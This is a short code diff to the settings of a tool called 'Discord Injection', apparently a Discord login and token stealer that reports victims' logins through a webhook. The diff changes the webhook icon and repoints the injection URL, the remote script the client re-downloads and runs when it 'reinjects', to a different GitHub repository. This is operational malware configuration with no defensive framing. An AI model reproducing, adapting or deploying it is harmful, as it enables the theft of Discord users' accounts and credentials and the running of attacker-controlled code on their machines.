@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon: 'https://cdn.discordapp.com/avatars/900079762771427419/afdb84d86340d35a36b184c9b913d0de.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/Raiden-Pax/Update/main/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
